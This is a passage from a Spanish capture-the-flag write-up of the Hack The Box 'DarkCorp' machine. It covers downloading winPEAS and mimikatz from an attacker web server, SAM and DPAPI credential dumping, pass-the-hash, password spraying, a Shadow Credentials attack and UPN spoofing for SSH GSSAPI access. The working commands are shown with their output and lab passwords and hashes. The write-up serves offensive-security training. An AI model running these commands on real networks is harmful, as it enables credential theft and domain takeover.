Desde el equipo `WEB-01$` nos descargaremos el binario a través de `Invoke-WebRequest` (abreviado como `IWR`) para poder transferir el binario de `winPEAS` de nuestro servidor web hacía la máquina objetivo. Verificaremos que el archivo ha sido descargado correctamente

```powershell
PS C:\ProgramData> IWR http://10.10.16.9/winPEASx64.exe -o C:\ProgramData\winPEASx64.exe
IWR http://10.10.16.9/winPEASx64.exe -o C:\ProgramData\winPEASx64.exe
PS C:\ProgramData> ls
ls


    Directory: C:\ProgramData


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-          5/8/2021   1:27 AM                Microsoft                                                            
d-----         1/16/2025  10:53 AM                Package Cache                                                        
d-----          5/8/2021   1:15 AM                regid.1991-06.com.microsoft                                          
d-----          5/8/2021   1:15 AM                SoftwareDistribution                                                 
d-----          5/8/2021   2:33 AM                ssh                                                                  
d-----         1/16/2025   6:04 AM                USOPrivate                                                           
d-----          5/8/2021   1:15 AM                USOShared                                                            
-a----          3/3/2023   5:15 AM          59392 nc.exe                                                               
-a----         4/22/2025   7:01 AM       10144256 winPEASx64.exe 
```

Al ejecutar el binario de `winPEAS`, en el resultado obtenido verificamos que obtenemos las credenciales localizadas en `AppCmd.exe` de la cuenta de servicio que anteriormente realizamos el **NTLM Relay** llamada `DARKCORP\SVC_ACC`

> `AppCmd.exe` es una herramienta de línea de comandos para administrar Internet Information Services (IIS) en versiones 7 y posteriores.
{: .prompt-info }

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_44.png)

Verificaremos nuevamente con `NetExec` de que las credenciales obtenidas son válidas a nivel de dominio.

```bash
❯ nxc ldap 172.16.20.1 -u 'svc_acc' -p 'VeteranLimitedCookies6!'
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\svc_acc:VeteranLimitedCookies6!
```
---
### Dumping SAM to get NT Administrator's hash

Por otro lado, el siguiente objetivo que decidimos apuntar es lograr obtener el hash NTLM del usuario Administrator (Local Admin en `WEB-01$`) para enumerar de una mejor manera al obtener credenciales, ya que actualmente estamos como `NT AUTHORITY\SYSTEM` debido al TGS realizado en el `S4U2Self`.

Para ello, compartiremos el binario de `mimikatz.exe` a través de un servidor web.

```bash
❯ ls -l /opt/precompiled-binaries/Credentials/mimikatz.exe
.rw-rw-r-- gzzcoo gzzcoo 1.2 MB Wed Apr  9 07:28:59 2025  /opt/precompiled-binaries/Credentials/mimikatz.exe
❯ python3 -m http.server 80 --directory /opt/precompiled-binaries/Credentials/
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina `WEB-01$` descargaremos el binario `mimikatz.exe` y lo alojaremos en el equipo objetivo.

```powershell
PS C:\ProgramData> IWR -Uri http://10.10.16.9/mimikatz.exe -OutFile C:\ProgramData\mimikatz.exe
IWR -Uri http://10.10.16.9/mimikatz.exe -OutFile C:\ProgramData\mimikatz.exe
PS C:\ProgramData> ls
ls


    Directory: C:\ProgramData


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d---s-          5/8/2021   1:27 AM                Microsoft                                                            
d-----         1/16/2025  10:53 AM                Package Cache                                                        
d-----          2/3/2025   3:40 PM                regid.1991-06.com.microsoft                                          
d-----          5/8/2021   1:15 AM                SoftwareDistribution                                                 
d-----          5/8/2021   2:33 AM                ssh                                                                  
d-----         1/16/2025   6:04 AM                USOPrivate                                                           
d-----          5/8/2021   1:15 AM                USOShared                                                            
-a----         4/22/2025   7:10 AM        1250056 mimikatz.exe                                                         
-a----          3/3/2023   5:15 AM          59392 nc.exe                                                               
-a----         4/22/2025   7:01 AM       10144256 winPEASx64.exe    
```

Para lograr obtener el hash NTLM del usuario Administrator del equipo `WEB-01$` deberemos de realizar el dump de la `SAM` mediante herramientas como `mimikatz`. En el resultado obtenido, obtenemos los hashes NTLM de los usuarios locales del equipo.

> El [Administrador de Cuentas de Seguridad (SAM)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) es un archivo de base de datos en los sistemas operativos Windows que almacena las credenciales de las cuentas de usuario. Se utiliza para autenticar tanto a usuarios locales como remotos y emplea protecciones criptográficas para prevenir el acceso no autorizado. Las contraseñas de los usuarios se almacenan como hashes en el registro, normalmente en forma de hashes **LM** o **NTLM**. El archivo SAM se encuentra en `%SystemRoot%\system32\config\SAM` y se monta bajo `HKLM\SAM`. Ver o acceder a este archivo requiere privilegios de nivel **SYSTEM**.
{: .prompt-info }

```powershell
PS C:\ProgramData> .\mimikatz.exe "lsadump::sam" exit
.\mimikatz.exe "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : WEB-01
SysKey : 4cf6d0e998d53752d088e233abb4bed6
Local SID : S-1-5-21-2988385993-1727309239-2541228647

SAMKey : 06ec26b0dde27ae449d2814b85a29e71

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 88d84ec08dad123eb04a060a74053f21

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f17116cf9d8b1e6411a27c35795f4d86

* Primary:Kerberos-Newer-Keys *
    Default Salt : ASDFAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 26c6b99ccd6bec59da0ec68d77d1b995f6fcee44043f8eb7a9c66749833d4b77
      aes128_hmac       (4096) : 80f0af26f6a073628cb882478a117e7a
      des_cbc_md5       (4096) : 7683897f834961fe
    OldCredentials
      aes256_hmac       (4096) : a9a8ca2cd9869ea15e2f90520ee73f391243d67d2a3b165fe96a9248473e39d2
      aes128_hmac       (4096) : 58514d7bcc6dc58481d3d2678cca4856
      des_cbc_md5       (4096) : 98e96d52fdc87345
    OlderCredentials
      aes256_hmac       (4096) : a9a8ca2cd9869ea15e2f90520ee73f391243d67d2a3b165fe96a9248473e39d2
      aes128_hmac       (4096) : 58514d7bcc6dc58481d3d2678cca4856
      des_cbc_md5       (4096) : 98e96d52fdc87345

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ASDFAdministrator
    Credentials
      des_cbc_md5       : 7683897f834961fe
    OldCredentials
      des_cbc_md5       : 98e96d52fdc87345


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

mimikatz(commandline) # exit
Bye!
```

Verificaremos el hash NTLM del Local Admin de `WEB-01$` a través de `NetExec`. Para ello, indicaremos que el dominio es `-d .` para que se autentique localmente y no a través de usuario del dominio `darkcorp.htb`. Verificamos que podemos realizar `Pass-the-Hash (PtH)` con el hash NTLM de `Administrator`.

```bash
❯ nxc smb 172.16.20.2 -u 'Administrator' -H '88d84ec08dad123eb04a060a74053f21' -d .
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False) 
SMB         172.16.20.2     445    WEB-01           [+] .\Administrator:88d84ec08dad123eb04a060a74053f21 (Pwn3d!)
```

Probamos de crackear el hash NTLM del usuario `Administrator` en [https://crackstation.net](https://crackstation.net) para posteriormente verificar si hay reutilización de credenciales a través de **Password Spraying**, pero no obtenemos éxito.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_45.png)

### Dumping DPAPI credz remotely with DonPapi.py

Uno de los objetivos más comunes en el cual podemos apuntar a revisar, son las credenciales protegidas por **DPAPI**.

> **DPAPI (Data Protection API)** es una API de Windows que protege datos sensibles como contraseñas y claves mediante criptografía. Su objetivo es asegurar que solo el usuario o equipo autorizado pueda acceder a esa información. Sin embargo, si un atacante tiene acceso al sistema o privilegios elevados, puede extraer o descifrar estos secretos usando herramientas como **Mimikatz** o **Impacket**.
> 
> Esto se convierte en un vector de escalación de privilegios, ya que los secretos protegidos pueden contener credenciales que permiten el acceso a otras cuentas o servicios.
{: .prompt-info }

[https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets)

En las siguientes rutas es donde se suelen almacenar las credenciales protegidas por DPAPI. En el resultado obtenido por la enumeración de `winPEAS`, verificamos que efectivamente existen credenciales del usuario `Administrator` protegidas por DPAPI.

> - `C:\Users\env:$USERNAME\AppData\Local\Microsoft\Credentials\`
>
> - `C:\Users\env:$USERNAME\AppData\Roaming\Microsoft\Credentials\`
{: .prompt-info }


![images](/assets/img/writeups/htb-darkcorp/DarkCorp_46.png)


Ya que disponemos del hash NTLM del usuario `Administrator`, podemos intentar realizar el dump de las credenciales protegidas por `DPAPI` remotamente desde la herramienta de `DonPAPI`. En el resultado obtenido, verificamos que logramos obtener las credenciales de `WEB-01\Administrator`, es decir, las credenciales correspondientes al hash NTLM que disponemos actualmente que no conseguimos romper su hash.

[https://github.com/login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)

```bash
❯ poetry run DonPAPI collect -t 172.16.20.2 -u Administrator -H :88d84ec08dad123eb04a060a74053f21 --dc-ip 172.16.20.1
The "poetry.dev-dependencies" section is deprecated and will be removed in a future version. Use "poetry.group.dev.dependencies" instead.
[💀] [+] DonPAPI Version 2.1.0
[💀] [+] Output directory at /home/gzzcoo/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/gzzcoo/.donpapi/recover/recover_1745331637
[172.16.20.2] [+] Starting gathering credz
[172.16.20.2] [+] Dumping SAM
[172.16.20.2] [-] Could not dump SAM.
[172.16.20.2] [-] No account found in SAM (maybe blocked by EDR)
[172.16.20.2] [+] Dumping LSA
[172.16.20.2] [+] Dumping User and Machine masterkeys
[172.16.20.2] [$] [DPAPI] Got 5 masterkeys
[172.16.20.2] [+] Dumping User and Machine Certificates
[172.16.20.2] [+] Dumping User Chromium Browsers
[172.16.20.2] [+] Gathering Cloud credentials
[172.16.20.2] [+] Dumping User and Machine Credential Manager
[172.16.20.2] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
[172.16.20.2] [+] Dumping User Firefox Browser
[172.16.20.2] [+] Gathering developement projects files
[172.16.20.2] [+] Dumping MRemoteNg Passwords
[172.16.20.2] [+] Dumping MobaXterm credentials
[172.16.20.2] [+] Gathering notepad++ backup files
[172.16.20.2] [+] Gathering password managers files
[172.16.20.2] [+] Gathering powershell history files
[172.16.20.2] [+] Dumping User`s RDCManager
[172.16.20.2] [+] Gathering recent files, desktop and download files
[172.16.20.2] [+] Gathering recycle bins
[172.16.20.2] [+] Dumping SCCM Credentials
[172.16.20.2] [+] Gathering ssh secrets files
[172.16.20.2] [+] Dumping VNC Credentials
[172.16.20.2] [+] Dumping User and Machine Vaults
[172.16.20.2] [+] Gathering version control system files
[172.16.20.2] [+] Dumping Token Broker Cache
[172.16.20.2] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Verificaremos que la contraseña en plaintext del usuario Local Admin de `WEB-01$` son válidas correctamente.

```bash
❯ nxc smb 172.16.20.2 -u 'Administrator' -p 'But_Lying_Aid9!' -d .
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False) 
SMB         172.16.20.2     445    WEB-01           [+] .\Administrator:But_Lying_Aid9! (Pwn3d!)
```
----
### Password Spraying with Kerbrute

Como mencionamos anteriormente, quizás estas credenciales son reutilizadas y mediante técnicas como **Password Spraying** podamos localizar otros usuarios con las mismas credenciales.

Para ello lo primero será obtener un listado de todos los usuarios válidos del dominio, el cual podemos obtenerlo mediante `NetExec` con el parámetro `--users` en el protocolo `LDAP`. El resultado obtenido lo almacenaremos en el archivo `users.txt`

```bash
❯ nxc ldap 172.16.20.1 -u 'victor.r' -p 'victor1gustavo@#' --users
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
LDAP        172.16.20.1     389    DC-01            [*] Enumerated 12 domain users: darkcorp.htb
LDAP        172.16.20.1     389    DC-01            -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        172.16.20.1     389    DC-01            Administrator                 2024-12-30 00:25:45 0        Built-in account for administering the computer/domain
LDAP        172.16.20.1     389    DC-01            Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        172.16.20.1     389    DC-01            krbtgt                        2024-12-30 00:29:05 0        Key Distribution Center Service Account
LDAP        172.16.20.1     389    DC-01            victor.r                      2025-01-06 17:53:19 0
LDAP        172.16.20.1     389    DC-01            svc_acc                       2024-12-30 00:39:38 0
LDAP        172.16.20.1     389    DC-01            john.w                        2024-12-30 00:39:48 0
LDAP        172.16.20.1     389    DC-01            angela.w                      2024-12-30 00:39:57 0
LDAP        172.16.20.1     389    DC-01            angela.w.adm                  2024-12-30 00:39:57 0
LDAP        172.16.20.1     389    DC-01            taylor.b                      2025-01-09 17:10:33 0
LDAP        172.16.20.1     389    DC-01            taylor.b.adm                  2025-01-08 22:55:01 0
LDAP        172.16.20.1     389    DC-01            eugene.b                      2025-02-03 18:30:41 0
LDAP        172.16.20.1     389    DC-01            bryce.c                       2025-02-03 18:31:26 0

❯ nxc ldap 172.16.20.1 -u 'victor.r' -p 'victor1gustavo@#' --users| tail -n +5 | awk '{print $5}' | grep -v '*' > users.txt
```

Una vez obtenido la lista de usuarios, lo que realizaremos es **Password Spraying** mediante la herramienta de `kerbrute` y su modo `passwordspray` con las credenciales del usuario Admin Local de `WEB-01$`. En el resultado obtenido, comprobamos que las credenciales son válidas para el usuario `john.w`.

```bash
❯ faketime "$(date +'%Y-%m-%d') $(net time -S 172.16.20.1 | awk '{print $4}')" zsh
❯ kerbrute passwordspray -d darkcorp.htb --dc dc-01.darkcorp.htb users.txt 'Pack_Beneath_Solid9!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/22/25 - Ronnie Flathers @ropnop

2025/04/22 16:52:17 >  Using KDC(s):
2025/04/22 16:52:17 >  	dc-01.darkcorp.htb:88

2025/04/22 16:52:18 >  [+] VALID LOGIN:	john.w@darkcorp.htb:Pack_Beneath_Solid9!
2025/04/22 16:52:18 >  Done! Tested 12 logins (1 successes) in 0.535 seconds
```

----

## Auth as angela.w

### BloodHound Enumeration

En este punto nos encontramos con diversas credenciales de acceso de usuarios del dominio `darkcorp.htb`. Es un preciso momento para realizar una enumeración sobre el entorno de Active Directory para buscar posibles rutas para movernos lateralmente y llegar finalmente a `Domain Admin`.

Es por ello que utilizaremos la herramienta de `BloodHound Community Edition` la cual levantaremos (en nuestro caso) de la siguiente manera en su archivo `docker-compose.yml` ya que está montado desde Docker.

- `DARKCORP\victor.r` --> `victor1gustavo@#`
- `DARKCORP\WEB-01$` --> `aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675`
- `DARKCORP\john.w` --> `Pack_Beneath_Solid9!`

> **BloodHound Community Edition (CE)** es una herramienta gratuita y de código abierto diseñada para permitir a las organizaciones identificar, probar y validar los riesgos de las rutas de ataque en entornos Active Directory, Entra ID y Azure.
{: .prompt-info }

```bash
❯ sudo docker-compose -f /opt/BloodHound-CE/docker-compose.yml up -d
Starting bloodhound-ce_graph-db_1 ... done
Starting bloodhound-ce_app-db_1   ... done
Starting bloodhound-ce_bloodhound_1 ... done
```

Para recolectar la información del dominio que debemos subministrar a `BloodHound CE`, uno de sus mejores `collectors` es el que está escrito en Rust llamado `rusthound`. En nuestro caso ha llegado a recopilar un total de 13 usuarios. 62 grupos, 4 OUs, etc. Todos los archivos JSON han sido comprimidos en un archivo `.zip` que subiremos a `BloodHound CE`.

> `RustHound` es un ingestor de datos de Active Directory para BloodHound Legacy escrito en Rust. 🦀 En un principio está diseñado para la versión `Legacy` de BloodHound y la variante `rusthound-ce` es multi plataforma compatible con `BloodHound CE` y `BloodHound Legacy`. En el momento de realizar `DarkCorp`, si era compatible para administrar a la versión a `BloodHound CE` como realizamos en este caso.
>
> En caso de tener problemas con [rusthound](https://github.com/NH-RED-TEAM/RustHound), utilizar la versión [rusthound-ce](https://github.com/g0h4n/RustHound-CE) que tiene sintaxis similar u otras opciones.
{: .prompt-info }

```bash
❯ rusthound -d darkcorp.htb -i 172.16.20.1 -u 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -z
---------------------------------------------------
Initializing RustHound at 16:53:43 on 04/22/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-04-22T14:53:43Z INFO  rusthound] Verbosity level: Info
[2025-04-22T14:53:44Z INFO  rusthound::ldap] Connected to DARKCORP.HTB Active Directory!
[2025-04-22T14:53:44Z INFO  rusthound::ldap] Starting data collection...
[2025-04-22T14:53:45Z INFO  rusthound::ldap] All data collected for NamingContext DC=darkcorp,DC=htb
[2025-04-22T14:53:45Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-04-22T14:53:45Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-04-22T14:53:45Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-04-22T14:53:45Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 13 users parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 62 groups parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 3 computers parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 4 ous parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 3 gpos parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-04-22T14:53:45Z INFO  rusthound::json::maker] .//20250422165345_darkcorp-htb_rusthound.zip created!

RustHound Enumeration Completed at 16:53:45 on 04/22/25! Happy Graphing!
```

Como mencionamos anteriormente, nos encontramos con estos usuarios los cuales hemos marcado como `Pawned` (la calavera que tienen algunos usuarios) y un par de usuarios que no tenemos información sobre ellos y quizás nos interesen movernos lateralmente.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_47.png)

A través de una de las querys que nos ofrece `BloodHound` llamada `Shorthest Path to Domain Admin`, obtenemos una ruta clara para llegar a comprometer el dominio entero y lograr obtener `Domain Admin`.

En la ruta mostrada a continuación, se verifica que si ganamos acceso como `taylor.b_adm`, podemos llegar a realizar una explotación de los permisos que dispone para obtener `DA` a través de `Group Policy Object (GPO)`. Por lo tanto, este usuario es un buen candidato para llegar a obtener acceso para acercarnos a obtener permisos de `DA`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_48.png)

---

### Abusing GenericWrite privileges to perform Shadow Credentials Attack

Revisando los `ACLs` que dispone el nuevo usuario obtenido `john.w@darkcorp.htb`, nos encontramos que dispone de `GenericWrite` sobre el usuario `angela.w@darkcorp.htb`.

- [https://www.hackingarticles.in/genericwrite-active-directory-abuse/](https://www.hackingarticles.in/genericwrite-active-directory-abuse/)
- [https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/abusing-active-directory-acls-aces/genericwrite](https://gzzcoo.gitbook.io/pentest-notes/active-directory-pentesting/abusing-active-directory-acls-aces/genericwrite)

> El permiso `GenericWrite` en Active Directory permite a un usuario modificar todos los atributos modificables de un objeto, excepto las propiedades que requieren permisos especiales, como restablecer contraseñas.
>
> Si un atacante obtiene `GenericWrite` sobre un usuario, puede escribir en el atributo `servicePrincipalNames` e iniciar inmediatamente un ataque `Kerberoasting` dirigido.
Además, tener `GenericWrite` sobre un grupo le permite añadir su cuenta, o una que controle, directamente a ese grupo, lo que le permite escalar privilegios de forma efectiva.
Alternativamente, si el atacante obtiene `GenericWrite` sobre un objeto, puede modificar el atributo `msds-KeyCredentialLink`. Como resultado, crea `Shadow Credentials` y se autentica como esa cuenta de equipo utilizando Kerberos PKINIT.
>
> Info via: [Hacking Articles](https://www.hackingarticles.in/genericwrite-active-directory-abuse/)
{: .prompt-info }

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_49.png)

En este caso, lo que optamos por realizar es un `Shadow Credentials Attack` para recuperar el hash NTLM del usuario objetivo y poder autenticarnos posteriormente como ese usuario realizando técnicas como **Pass-the-Hash (PtH)**.

En el resultado obtenido llegamos a obtener un TGT (Ticket Granting Ticket) en el archivo `angela.w.ccache` del usuario objetivo y logramos recuperar también su hash NTLM.

> El ataque conocido como `Shadow Credentials` permite a un atacante obtener acceso persistente a una cuenta de Active Directory (usuario o máquina) sin conocer su contraseña ni su hash. Para lograrlo, se abusa del atributo poco conocido llamado `msDS-KeyCredentialLink`, introducido con Windows Server 2016.
>
> Este atributo permite almacenar claves públicas asociadas a una cuenta para autenticación mediante `Kerberos PKINIT`, un método que reemplaza el uso de contraseñas por criptografía asimétrica (clave pública/privada).
>
>Si un atacante tiene permisos como `WriteProperty`, `GenericWrite` o `GenericAll` sobre ese atributo en una cuenta objetivo, puede inyectar su propia clave pública. Luego, puede autenticarse como ese usuario usando `PKINIT` y su clave privada, consiguiendo un TGT válido sin necesidad de contraseñas ni tickets previos.
{: .prompt-info }

```bash
❯ certipy-ad shadow auto -username 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -account 'angela.w' -dc-ip 172.16.20.1
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fed88f8f-21d6-d955-6ab6-d54b3d91c51b'
[*] Adding Key Credential with device ID 'fed88f8f-21d6-d955-6ab6-d54b3d91c51b' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID 'fed88f8f-21d6-d955-6ab6-d54b3d91c51b' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Using principal: angela.w@darkcorp.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

Validaremos a través de `NetExec` de realizar `Pass-the-Hash(PtH)` con el hash NTLM del usuario `angela.w@darkcorp.htb`. En el resultado obtenido, comprobamos la autenticación válida para estas nuevas credenciales, con lo que ya podemos actuar en nombre de `angela.w` en el dominio `darkcorp.htb`.

```bash
❯ nxc ldap 172.16.20.1 -u 'angela.w' -H '957246c8137069bca672dc6aa0af7c7a'
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a 
```
---
## Shell as angela.w.adm on DRIP

### Finding a vector to elevate privileges in BloodHound

Realizando nuevamente una comprobación en `BloodHound` para encontrar un vector para elevar nuestros privilegios, nos encontramos con lo siguiente.

En el siguiente grafo, verificamos la existencia de dos usuarios que forman parte del grupo `LINUX_ADMINS@DARKCORP.HTB`. Uno de estos usuarios es el de `angela.w.adm`, lo que parece ser que sea una cuenta administrativa para Linux del usuario actual `angela.w` el cual si disponemos de sus credenciales.

Sería una gran idea poder encontrar la manera de llegar a obtener acceso como `angela.w.adm` ya que es `Linux Admin` y quizás accediendo al `SSH` del equipo `172.16.20.3 - drip.darkcorp.htb` con permisos de `root` obtengamos más información extra que nos pueda servir para seguir moviéndonos lateralmente.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_50.png)

Es posible que al tratarse de su cuenta administrativa, utilice las mismas credenciales de acceso para autenticarse. Es por ello que decidimos tratar de validar con `NetExec`, pero en el resultado obtenido nos indicó el mensaje de `STATUS_LOGON_FAILURE`. Este mensaje indica que las credenciales proporcionadas no son válidas para este usuario.

```bash
❯ nxc smb 172.16.20.1 -u 'angela.w.adm' -H '957246c8137069bca672dc6aa0af7c7a'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:957246c8137069bca672dc6aa0af7c7a STATUS_LOGON_FAILURE
```
---
### SSH GSSAPI - userPrincipalName (UPN) Spoofing

> **GSSAPI (Generic Security Services Application Program Interface)** es una API que proporciona servicios de seguridad (como autenticación) y actúa como una capa de abstracción para distintos mecanismos de seguridad, como Kerberos.
>
> **Requisitos**:
> - Permiso de escritura en el campo Public-Information
> - Servidor SSH que soporte GSSAPI authentication
>
> Dado que MIT Kerberos **no verifica el PAC**, controlar una cuenta de dominio y alterar su UPN nos permite suplantar a otro usuario.
{: .prompt-info }

Para más información, podemos consultar la siguiente página web donde se explica y se detalla la metodología del ataque: [SSH-GSSAPI](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/#ssh-gssapi).

Comprobamos si el servidor SSH de `drip.darkcorp.htb` tiene `GSSAPIAuthentication` habilitado. El resultado muestra que GSSAPI authentication está habilitado, por lo que el servidor es candidato válido para el ataque.

```bash
ebelford@drip:~$ cat /etc/ssh/sshd_config | grep GSSAPI
# GSSAPI options
GSSAPIAuthentication yes
GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no
```

En este punto disponemos de un escenario favorable para autenticarnos como `angela.w.adm` en el servidor SSH `drip.darkcorp.htb (172.16.20.3)` mediante la modificación del `userPrincipalName (UPN)` y el uso de `GSSAPI Authentication`.

> **Escenario actual:**
>
> - El usuario `john.w` tiene `GenericWrite` sobre `angela.w`, por lo que puede modificar su atributo `userPrincipalName (UPN)`.
>
> - Disponemos de credenciales que permiten realizar `Pass-the-Hash` para autenticarnos como `angela.w`.
>
> - El servidor SSH `drip.darkcorp.htb` soporta `GSSAPI Authentication`.
>
> **Flujo de ataque propuesto:**
>
> - Con `john.w` modificar el `userPrincipalName` de `angela.w` a `angela.w.adm`.
>
> - Solicitar un TGT a nombre de `angela.w.adm` usando las credenciales de `angela.w`.
>
> - Autenticarnos en `drip.darkcorp.htb` mediante SSH y GSSAPI Authentication empleando el TGT obtenido.
>
> Con este procedimiento, una vez teniéndolo modificado y con el TGT válido, deberíamos poder acceder al servidor SSH como `angela.w.adm` a través de Kerberos.
{: .prompt-tip }

El primer paso del flujo de ataque es modificar el `userPrincipalName (UPN)` del usuario `angela.w` a través de `john.w` para que el nuevo UPN sea el de `angela.w.adm`. Con esto, el `userPrincipalName (UPN)` de `angela.w` pasará de `angela.w@darkcorp.htb` a `angela.w.adm@darkcorp.htb`

> El `userPrincipalName (UPN)` es el nombre de inicio de sesión de estilo internet para un usuario, compuesto por un prefijo (nombre de usuario) y un sufijo (dominio), como `user@domain.com`. Es el nombre que los usuarios utilizan para iniciar sesión en servicios de Windows, Active Directory y Microsoft Entra ID. 
{: .prompt-info }

```bash
# Método desde Certipy para modificar el UPN
❯ certipy-ad account update -username john.w@darkcorp.htb -p 'Pack_Beneath_Solid9!' -user angela.w -upn 'angela.w.adm'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'angela.w':
    userPrincipalName                   : angela.w.adm
[*] Successfully updated 'angela.w'

# Método desde PowerView.py para modificar el UPN
❯ powerview darkcorp.htb/john.w:'Pack_Beneath_Solid9!'@172.16.20.1 --dc-ip 172.16.20.1
Logging directory is set to /home/gzzcoo/.powerview/logs/darkcorp-john.w-172.16.20.1
[2025-04-22 18:10:28] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache
(LDAPS)-[DC-01.darkcorp.htb]-[darkcorp\john.w]
PV > Set-DomainObject -Identity angela.w -Set userPrincipalName=angela.w.adm
[2025-04-22 18:10:50] [Set-DomainObject] Success! modified attribute userprincipalname for CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb
```

Una vez modificado el `userPrincipalName (UPN)` de `angela.w` a `angela.w.adm`, el siguiente paso es solicitar un Ticket Granting Ticket (TGT).

Al solicitar el TGT debemos indicar el parámetro `-principalType NT_ENTERPRISE` para que la búsqueda priorice el `userPrincipalName` frente al `samAccountName`. De este modo, usando las credenciales de `angela.w` solicitaremos un TGT para `darkcorp/angela.w.adm`; dado que el `userPrincipalName` fue previamente modificado, obtendremos un TGT emitido a nombre de `angela.w.adm`. Este ticket se guardará en un fichero `.ccache` que posteriormente exportaremos como `KRB5CCNAME` y utilizaremos para autenticarnos vía SSH + GSSAPI.

```bash
❯ impacket-getTGT darkcorp.htb/angela.w.adm -hashes :957246c8137069bca672dc6aa0af7c7a -dc-ip 172.16.20.1 -principalType NT_ENTERPRISE
